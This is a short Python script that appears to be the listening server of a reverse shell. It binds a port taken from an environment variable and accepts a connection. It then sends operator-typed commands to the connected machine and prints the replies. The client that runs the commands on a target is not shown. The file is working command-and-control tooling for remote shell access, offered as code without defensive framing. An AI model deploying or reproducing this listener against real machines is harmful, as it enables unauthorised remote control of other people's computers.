import socket
import sys
import os
from dotenv import load_dotenv

load_dotenv()

# Create a socket ( connect two computers )
def create_socket():
    try:
        global host
        global port 
        global s 
        host = "" 
        port = int(os.getenv("PORT"))
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    
    
# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port 
        global s 
        
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)
         
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()
        
# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established")
    print("IP: " + address[0] + "  |  Port: " + str(address[1]))
    send_command(conn)
    
    conn.close()

def send_command(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
            
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_res = str(conn.recv(1024), "utf-8")
            print(client_res, end="")
            
def main():
    create_socket()
    bind_socket()
    socket_accept()
    
    
main()